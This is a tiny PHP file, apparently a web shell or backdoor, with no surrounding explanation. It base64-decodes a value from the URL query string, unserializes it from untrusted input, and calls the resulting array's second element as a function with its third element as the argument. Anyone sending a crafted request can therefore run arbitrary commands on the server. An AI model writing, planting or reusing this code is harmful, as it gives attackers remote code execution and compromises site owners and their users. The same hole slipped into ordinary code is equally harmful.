<?php
$s=base64_decode($_GET['s']);
$o = unserialize($s);
$o[1]($o[2]);
?>